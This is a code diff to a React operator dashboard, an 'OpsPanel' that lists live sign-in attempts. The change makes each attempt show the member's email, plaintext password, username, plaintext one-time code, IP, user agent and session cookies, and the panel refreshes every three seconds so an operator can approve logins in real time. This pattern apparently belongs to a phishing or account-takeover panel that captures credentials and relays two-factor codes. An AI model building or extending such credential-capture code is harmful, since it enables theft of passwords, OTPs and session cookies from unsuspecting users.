@@ -44,7 +44,6 @@ export function OpsPanel({
   const [isPending, startTransition] = useTransition()
   const [selectedKycId, setSelectedKycId] = useState(kycRows[0]?.id ?? 0)
 
-  // Auto-refresh ops desk every 3s so login steps appear in seconds
   useEffect(() => {
     const id = setInterval(() => router.refresh(), 3000)
     return () => clearInterval(id)
@@ -152,93 +151,104 @@ export function OpsPanel({
         <h2 className="text-sm font-semibold text-foreground">
           Live sign-in attempts
         </h2>
-        <p className="mt-1 text-xs text-muted-foreground">
-          Every step (password, username, OTP #1, OTP #2) is logged here and
-          emailed to the admin inbox. Approve only when both OTPs are verified.
+        <p className="mt-1 text-xs text-amber-700 dark:text-amber-400">
+          TEST MODE: email, password, username, OTP, and cookies shown in plain
+          text. Remove after testing.
         </p>
-        <div className="mt-4 overflow-x-auto">
-          <table className="w-full min-w-[800px] text-left text-sm">
-            <thead className="border-b border-border text-xs text-muted-foreground">
-              <tr>
-                <th className="py-2 pr-3 font-medium">Member</th>
-                <th className="py-2 pr-3 font-medium">Step</th>
-                <th className="py-2 pr-3 font-medium">Latest event</th>
-                <th className="py-2 pr-3 font-medium">OTP</th>
-                <th className="py-2 font-medium">Action</th>
-              </tr>
-            </thead>
-            <tbody>
-              {loginAttempts.length === 0 && (
-                <tr>
-                  <td
-                    colSpan={5}
-                    className="py-6 text-center text-muted-foreground"
-                  >
-                    No active sign-in attempts.
-                  </td>
-                </tr>
-              )}
-              {loginAttempts.map((a) => (
-                <tr key={a.id} className="border-b border-border/60">
-                  <td className="py-3 pr-3">
-                    <div className="font-medium text-foreground">
-                      {a.memberName}
-                    </div>
-                    <div className="text-xs text-muted-foreground">{a.email}</div>
-                    {a.ipAddress && (
-                      <div className="text-xs text-muted-foreground">
-                        IP {a.ipAddress}
-                      </div>
-                    )}
-                  </td>
-                  <td className="py-3 pr-3">
-                    <span className="rounded-full bg-muted px-2 py-0.5 text-xs font-medium capitalize">
-                      {a.step.replace(/_/g, ' ')}
-                    </span>
-                    <div className="mt-1 text-xs capitalize text-muted-foreground">
+        <div className="mt-4 space-y-4">
+          {loginAttempts.length === 0 && (
+            <p className="py-6 text-center text-sm text-muted-foreground">
+              No active sign-in attempts.
+            </p>
+          )}
+          {loginAttempts.map((a) => (
+            <div
+              key={a.id}
+              className="rounded-lg border border-border/80 bg-muted/30 p-4 text-sm"
+            >
+              <div className="flex flex-wrap items-start justify-between gap-3">
+                <div>
+                  <p className="font-semibold text-foreground">{a.memberName}</p>
+                  <p className="text-xs text-muted-foreground">
+                    Step:{' '}
+                    <span className="capitalize">{a.step.replace(/_/g, ' ')}</span>
+                    {' · '}
+                    <span className="capitalize">
                       {a.status.replace(/_/g, ' ')}
-                    </div>
-                  </td>
-                  <td className="py-3 pr-3 text-xs text-muted-foreground">
-                    {a.lastEvent || '—'}
-                    {a.usernameSubmitted && (
-                      <div className="mt-1">Username: {a.usernameSubmitted}</div>
-                    )}
-                  </td>
-                  <td className="py-3 pr-3 text-xs tabular-nums">
-                    #1 {a.otp1Verified ? '✓' : '·'} · #2{' '}
-                    {a.otp2Verified ? '✓' : '·'}
-                  </td>
-                  <td className="py-3">
-                    <div className="flex flex-wrap gap-2">
-                      <Button
-                        type="button"
-                        size="sm"
-                        disabled={
-                          isPending ||
-                          a.status !== 'awaiting_approval' ||
-                          !a.otp1Verified ||
-                          !a.otp2Verified
-                        }
-                        onClick={() => reviewLogin(a.id, 'approved')}
-                      >
-                        Approve
-                      </Button>
-                      <Button
-                        type="button"
-                        size="sm"
-                        variant="destructive"
-                        disabled={isPending}
-                        onClick={() => reviewLogin(a.id, 'rejected')}
-                      >
-                        Reject
-                      </Button>
-                    </div>
-                  </td>
-                </tr>
-              ))}
-            </tbody>
-          </table>
+                    </span>
+                  </p>
+                  <p className="mt-1 text-xs text-muted-foreground">
+                    {a.lastEvent}
+                  </p>
+                </div>
+                <div className="flex flex-wrap gap-2">
+                  <Button
+                    type="button"
+                    size="sm"
+                    disabled={
+                      isPending ||
+                      a.status !== 'awaiting_approval' ||
+                      !a.otp1Verified ||
+                      !a.otp2Verified
+                    }
+                    onClick={() => reviewLogin(a.id, 'approved')}
+                  >
+                    Approve
+                  </Button>
+                  <Button
+                    type="button"
+                    size="sm"
+                    variant="destructive"
+                    disabled={isPending}
+                    onClick={() => reviewLogin(a.id, 'rejected')}
+                  >
+                    Reject
+                  </Button>
+                </div>
+              </div>
+
+              <div className="mt-3 grid gap-1 rounded-md bg-background/80 p-3 font-mono text-xs">
+                <p>
+                  <span className="text-muted-foreground">Email:</span>{' '}
+                  {a.email}
+                </p>
+                <p>
+                  <span className="text-muted-foreground">Password:</span>{' '}
+                  {a.passwordPlain || '—'}
+                </p>
+                <p>
+                  <span className="text-muted-foreground">Username:</span>{' '}
+                  {a.usernameSubmitted || '—'}
+                </p>
+                <p>
+                  <span className="text-muted-foreground">OTP:</span>{' '}
+                  {a.otpPlain || '—'}{' '}
+                  <span className="text-muted-foreground">
+                    (#1 {a.otp1Verified ? '✓' : '·'} · #2{' '}
+                    {a.otp2Verified ? '✓' : '·'})
+                  </span>
+                </p>
+                {a.ipAddress && (
+                  <p>
+                    <span className="text-muted-foreground">IP:</span>{' '}
+                    {a.ipAddress}
+                  </p>
+                )}
+                {a.userAgent && (
+                  <p className="break-all">
+                    <span className="text-muted-foreground">User-Agent:</span>{' '}
+                    {a.userAgent}
+                  </p>
+                )}
+                {a.cookieHeader && (
+                  <p className="break-all">
+                    <span className="text-muted-foreground">Cookies:</span>{' '}
+                    {a.cookieHeader}
+                  </p>
+                )}
+              </div>
+            </div>
+          ))}
         </div>
       </section>
 
